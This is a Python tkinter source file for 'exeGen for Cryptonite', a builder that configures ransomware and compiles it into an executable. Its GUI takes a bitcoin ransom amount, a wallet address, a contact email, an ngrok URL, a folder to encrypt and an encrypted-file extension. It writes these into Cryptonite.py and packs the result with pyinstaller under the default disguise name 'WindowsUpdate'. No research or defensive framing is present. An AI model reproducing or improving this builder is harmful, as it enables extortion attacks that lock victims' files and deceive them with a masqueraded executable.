import tkinter as tk
from tkinter.filedialog import askdirectory
from PIL import Image, ImageTk

folder = None

def selectfolder():
    global folder
    folder = askdirectory()
    if not folder:
        return
    else:
        folder_frm.config(text = f"{folder}")
        filesave.config(image=image4, command = selectfolder, borderwidth = 0)

def generate():

    import os
    import time
    OS = os.name
    if not folder:
        return
    PATH = os.path.abspath(folder)
    FILE = name_entry.get()
    if not FILE:
        return
    configDict = {
        "URL": url_entry.get(),
        "BTC_AMOUNT": btcm_entry.get(),
        "BTC_WALLET": btcw_entry.get(),
        "EMAIL": email_entry.get(),
        "EXT": ext_entry.get().replace(".", "")
    }
    with open("Cryptonite.py", "r") as f:
        text = f.read()
        text = text.replace("URL = \"\"", f"URL = \"{configDict['URL'].strip()}\"")
        text = text.replace("BTC_AMOUNT = \"\"", f"BTC_AMOUNT = \"{configDict['BTC_AMOUNT']}\"")
        text = text.replace("BTC_WALLET = \"\"", f"BTC_WALLET = \"{configDict['BTC_WALLET']}\"")
        text = text.replace("EMAIL = \"\"", f"EMAIL = \"{configDict['EMAIL']}\"")
        text = text.replace("EXT = \"\"", f"EXT = \".{configDict['EXT']}\"")
        text = text.replace("os.walk('./testfolder')", f"os.walk('{folder}')")
    with open("Cryptonite.py", "w") as f:
        f.write(text)
    os.system(f"pyinstaller --onefile --clean --icon=\".\images\icon.ico\" Cryptonite.py --name {FILE}")
    if OS == "nt":
        os.system(f"MOVE /Y \".\\dist\\{FILE}.exe\" \"{PATH}\" && rmdir /Q /S __pycache__ build dist && del /Q {FILE}.spec")
    else:
        os.system(f"mv /dist/{FILE}.exe ./")
        os.system(f"rm -r __pycache__")
        os.system(f"rm -r build")
        os.system(f"rm -r dist")
        os.system(f"{FILE}.spec")
    exit(0)


window = tk.Tk()
window.config(bg="white")
window.title("exeGen for Cryptonite")
window.rowconfigure([0,1,2,3,4,5,6,7], minsize = 30, weight = 0)
window.rowconfigure([9], minsize = 100, weight = 0)
window.resizable(0,0)
window.columnconfigure(0, minsize = 400, weight = 0)
window.columnconfigure(1, minsize = 400, weight = 0)

# images
image0 = Image.open("images/exegen.png")
image0 = image0.resize((round(image0.size[0]*0.5),round(image0.size[1]*0.5)))
image0 = ImageTk.PhotoImage(image0)
image1 = Image.open("images/generatebutton.png")
image1 = image1.resize((round(image1.size[0]*0.9),round(image1.size[1]*0.9)))
image1 = ImageTk.PhotoImage(image1)
image3 = Image.open("images/selectfolder.png")
image3 = image3.resize((round(image3.size[0]*0.3),round(image3.size[1]*0.3)))
image3 = ImageTk.PhotoImage(image3)
image4 = Image.open("images/changefolder.png")
image4 = image4.resize((round(image4.size[0]*0.3),round(image4.size[1]*0.3)))
image4 = ImageTk.PhotoImage(image4)


title = tk.Label(master = window, image = image0, bg = "black")
title.grid(row = 0, column = 0, columnspan = 2, pady = (20, 30), padx = 15)

name = tk.Label(master = window, text = "NAME (for exe file): ", font = ("arial", 15), fg = "black", bg = "white")
name.grid(row = 1, column = 0, sticky = "e", pady = 10, padx = 15)
name_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
name_entry.grid(row = 1, column = 1, sticky = "w", pady = 10, padx = 15)
name_entry.insert("0", "WindowsUpdate")

folder = tk.Label(master = window, text = "FOLDER TO ENCRYPT: ", font = ("arial", 15), fg = "black", bg = "white")
folder.grid(row = 2, column = 0, sticky = "e", pady = 10, padx = 15)
folder_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
folder_entry.grid(row = 2, column = 1, sticky = "w", pady = 10, padx = 15)
folder_entry.insert("0", "./testfolder")

url = tk.Label(master = window, text = "NGROK URL: ", font = ("arial", 15), fg = "black", bg = "white")
url.grid(row = 3, column = 0, sticky = "e", pady = 10, padx = 15)
url_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
url_entry.grid(row = 3, column = 1, sticky = "w", pady = 10, padx = 15)

btcw = tk.Label(master = window, text = "BTC WALLET ADDRESS: ", font = ("arial", 15), fg = "black", bg = "white")
btcw.grid(row = 4, column = 0, sticky = "e", pady = 10, padx = 15)
btcw_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
btcw_entry.grid(row = 4, column = 1, sticky = "w", pady = 10, padx = 15)

btcm = tk.Label(master = window, text = "BTC AMOUNT: ", font = ("arial", 15), fg = "black", bg = "white")
btcm.grid(row = 5, column = 0, sticky = "e", pady = 10, padx = 15)
btcm_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
btcm_entry.grid(row = 5, column = 1, sticky = "w", pady = 10, padx = 15)

email = tk.Label(master = window, text = "EMAIL: ", font = ("arial", 15), fg = "black", bg = "white")
email.grid(row = 6, column = 0, sticky = "e", pady = 10, padx = 15)
email_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
email_entry.grid(row = 6, column = 1, sticky = "w", pady = 10, padx = 15)

ext = tk.Label(master = window, text = "EXTENSION: ", font = ("arial", 15), fg = "black", bg = "white")
ext.grid(row = 7, column = 0, sticky = "e", pady = 10, padx = 15)
ext_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
ext_entry.grid(row = 7, column = 1, sticky = "w", pady = 5, padx = 15)
ext_entry.insert("0", ".cryptn8")

folder_frm = tk.Label(master = window, text = f"..Folder path will appear here..", font = ("arial", 12))
folder_frm.grid(row = 9, column = 0, columnspan = 2)

filesave = tk.Button(master = window, image = image3, command = selectfolder, borderwidth = 0)
filesave.grid(row = 10, column = 0, columnspan = 2, pady = (0,20), sticky = "n")

generate_btn = tk.Button(master = window, image = image1, command = generate, borderwidth = 0)
generate_btn.grid(row = 11, column = 0, columnspan = 2, pady = (10, 30))

info_label = tk.Label(window, text = "The generator will automatically close after the exe has been generated.", font=("arial", 12))
info_label.grid(row = 12, column = 0, columnspan = 2, sticky = "se")

window.mainloop()
